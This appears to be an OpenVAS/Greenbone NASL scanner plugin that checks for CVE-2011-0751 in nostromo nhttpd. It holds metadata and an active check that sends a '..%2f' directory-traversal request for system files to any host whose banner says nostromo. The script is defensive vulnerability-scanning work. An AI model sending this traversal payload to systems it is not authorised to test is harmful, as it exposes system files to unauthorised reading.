if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103119" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2011-03-21 13:19:58 +0100 (Mon, 21 Mar 2011)" );
	script_bugtraq_id( 46880 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2011-0751" );
	script_name( "nostromo nhttpd Directory Traversal Remote Command Execution Vulnerability" );
	script_xref( name: "URL", value: "https://www.securityfocus.com/bid/46880" );
	script_xref( name: "URL", value: "http://www.nazgul.ch/dev_nostromo.html" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/517026" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "gb_get_http_banner.sc", "os_detection.sc" );
	script_mandatory_keys( "nostromo/banner" );
	script_require_ports( "Services/www", 80 );
	script_tag( name: "solution", value: "Updates are available. Please see the references for details." );
	script_tag( name: "summary", value: "nostromo nhttpd is prone to a remote command-execution vulnerability
  because it fails to properly validate user-supplied data." );
	script_tag( name: "impact", value: "An attacker can exploit this issue to access arbitrary files and
  execute arbitrary commands with application-level privileges." );
	script_tag( name: "affected", value: "nostromo versions prior to 1.9.4 are affected." );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
port = http_get_port( default: 80 );
banner = http_get_remote_headers( port: port );
if(!ContainsString( banner, "Server: nostromo" )){
	exit( 0 );
}
files = traversal_files();
for file in keys( files ) {
	url = NASLString( "/", crap( data: "..%2f", length: 10 * 5 ), files[file] );
	if(http_vuln_check( port: port, url: url, pattern: file )){
		security_message( port: port );
		exit( 0 );
	}
}
exit( 0 );

